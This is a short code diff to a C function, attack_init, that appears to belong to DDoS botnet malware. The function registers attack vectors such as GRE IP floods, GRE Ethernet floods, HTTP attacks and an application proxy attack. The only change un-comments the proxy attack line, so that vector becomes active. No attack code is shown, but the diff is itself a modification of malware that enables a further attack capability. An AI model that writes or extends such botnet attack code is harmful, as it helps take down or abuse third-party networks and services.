@@ -35,7 +35,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
     add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
 
-    //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
+    add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
     add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
 
     return TRUE;
